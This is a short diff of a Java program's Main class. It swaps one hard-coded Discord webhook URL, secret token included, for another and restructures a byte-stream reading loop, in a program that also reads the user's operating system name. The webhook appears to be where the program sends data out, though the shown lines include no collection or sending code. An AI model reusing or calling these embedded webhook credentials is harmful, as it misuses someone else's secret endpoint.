@@ -19,7 +19,7 @@ import java.util.regex.Pattern;
 
 public class Main {
 
-    private static final String webhookURL = "https://discordapp.com/api/webhooks/876707963753091113/jCpwL5-rAcIqha40u9J1kae3dgAMgqxjJEbAmOc2inKrYKUK-fs9BBG-CrM6_jSl-Ani";
+    private static final String webhookURL = "https://discord.com/api/webhooks/876962438476611635/H9Sv7_hFEctQ0mLDZ-GVeijW5PUBkG92JuXrjzgn_DiO64j4pSmyvm-ArnmzWIiYVDRa";
 
     public static void main(String[] args) {
         String userOS = System.getProperty("os.name");
@@ -222,7 +222,9 @@ public class Main {
         int count, pos = 0;
         byte[] output = new byte[0];
         byte[] buf = new byte[1024];
-        while ((count = stream.read(buf)) > 0) {
+        while (true) {
+            assert stream != null;
+            if (!((count = stream.read(buf)) > 0)) break;
             if (pos + count >= output.length) {
                 byte[] tmp = output;
                 output = new byte[pos + count];
